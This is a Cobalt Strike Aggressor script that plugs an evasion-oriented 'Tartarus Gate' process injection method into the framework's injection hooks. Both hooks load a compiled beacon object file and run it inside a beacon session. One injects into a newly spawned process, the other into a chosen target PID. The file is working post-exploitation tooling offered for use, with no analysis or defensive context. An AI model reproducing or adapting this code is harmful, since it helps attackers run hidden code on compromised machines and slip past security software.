# author REDMED-X
#
# This is a fork from the script_template.cna that is part of the CS Process Injection Kit.

println("InjectKit method Tartarus Gate loaded");

set PROCESS_INJECT_SPAWN {
    println("Process Inject - PROCESS_INJECT_SPAWN hook");

    local('$barch $handle $data $args $entry');
 
    # Set the architecture for the beacon's session
    $barch = barch($1);
 
    # read in the injection BOF based on barch
    $handle = openf(script_resource("bin/process_inject_spawn.x64.o"));
    $data   = readb($handle, -1);
    closef($handle);

    println("Process Inject - Length " . strlen($data));

    # pack our arguments needed for the BOF
    $args = bof_pack($1, "sb", $3, $2);
 
    btask($1, "Process Inject using fork and run.");
 
    # Set the entry point based on the dll's arch
    $entry = "go $+ $4";
    beacon_inline_execute($1, $data, $entry, $args);
 
    return 1;
}

set PROCESS_INJECT_EXPLICIT {

    println("Process Inject - PROCESS_INJECT_EXPLICIT hook");

    local('$barch $handle $data $args $entry');
 
    # Set the architecture for the beacon's session
    $barch = barch($1);
   
    # read in the injection BOF based on barch
	$handle = openf(script_resource("bin/process_inject_explicit.x64.o"));
    $data   = readb($handle, -1);
    closef($handle);

    println("Process Inject - Length " . strlen($data));
    println("Process Inject - Target PID " . $3);
 
    # pack our arguments needed for the BOF
    $args = bof_pack($1, "iib", $3, $4, $2);
 
    btask($1, "Process Inject using explicit injection into pid $3");
 
    # Set the entry point based on the dll's arch
    $entry = "go $+ $5";
    beacon_inline_execute($1, $data, $entry, $args);
 
    return 1;
}

